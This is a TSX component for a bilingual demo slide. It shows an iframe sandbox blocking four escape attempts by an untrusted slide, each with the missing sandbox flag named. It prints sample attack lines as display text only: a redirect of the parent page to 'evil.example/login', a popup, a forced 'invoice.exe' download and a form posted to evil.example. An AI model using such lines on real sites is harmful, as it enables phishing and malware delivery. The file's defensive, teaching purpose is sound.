'use client'

import { createMemo, createSignal } from '@barefootjs/client'
import { messages, type Lang } from '../src/site/i18n'

/** What a stranger's slide tries, each refused by a missing sandbox flag. */
const ATTEMPTS = ['top', 'popup', 'download', 'form'] as const
type Attempt = (typeof ATTEMPTS)[number]

/** The code a slide runs for each attempt; it reads the same in any language. */
const CODE: Readonly<Record<Attempt, string>> = {
  top: 'top.location = "https://evil.example/login"',
  popup: 'window.open("https://evil.example")',
  download: 'a.download = "invoice.exe"; a.click()',
  form: 'form.action = "https://evil.example"; form.submit()',
}

/** The sandbox flag whose absence stops each attempt. */
const FLAG: Readonly<Record<Attempt, string>> = {
  top: 'allow-top-navigation',
  popup: 'allow-popups',
  download: 'allow-downloads',
  form: 'allow-forms',
}

const text = messages({
  ja: {
    title: 'このスライドは、枠の外に出ようとする',
    attempts: {
      top: '親ページを偽サイトへ移動',
      popup: '別タブを開く',
      download: 'ファイルを落とす',
      form: 'フォームを送る',
    },
    prompt: '▶ ボタンを押すと、このスライドが命令を実行します',
    blocked: (flag: string) => `✕ sandbox が遮断（${flag} なし）`,
    frame: '· 配信 origin は管理画面と別',
  },
  en: {
    title: 'This slide tries to break out of its frame',
    attempts: {
      top: 'Send the parent page to a fake site',
      popup: 'Open another tab',
      download: 'Download a file',
      form: 'Submit a form',
    },
    prompt: '▶ Press a button and this slide runs the command',
    blocked: (flag: string) => `✕ Blocked by the sandbox (no ${flag})`,
    frame: '· served from an origin apart from the dashboard',
  },
})

interface SandboxDemoProps {
  /** The page's language, for the labels. */
  lang: Lang
}

/**
 * The top page's sandbox slide: press what a stranger's slide might try, and
 * the log shows the sandbox refusing it. Nothing runs here: it shows how a
 * refusal reads, and the viewer's browser tests check the real frame.
 */
export function SandboxDemo(props: SandboxDemoProps) {
  const [tried, setTried] = createSignal<Attempt | null>(null)
  const t = text[props.lang]
  const code = createMemo(() => CODE[tried() ?? 'top'])
  const log = createMemo(() => {
    const attempt = tried()
    return attempt === null ? t.prompt : t.blocked(FLAG[attempt])
  })
  return (
    <>
      <div className="mock-slide mock-live">
        <div className="mock-title">{t.title}</div>
        <div className="mock-buttons">
          {ATTEMPTS.map((attempt) => (
            <button
              key={attempt}
              type="button"
              className="mock-button"
              aria-pressed={tried() === attempt ? 'true' : 'false'}
              onClick={() => setTried(attempt)}
            >
              {t.attempts[attempt]}
            </button>
          ))}
        </div>
        <div className="mock-code">{code()}</div>
        <div className="mock-log" aria-live="polite">
          {log()}
        </div>
        <span className="mock-no">9</span>
      </div>
      <div className="mock-url">
        {
          '<iframe sandbox="allow-scripts allow-same-origin" referrerpolicy="no-referrer">'
        }{' '}
        {t.frame}
      </div>
    </>
  )
}
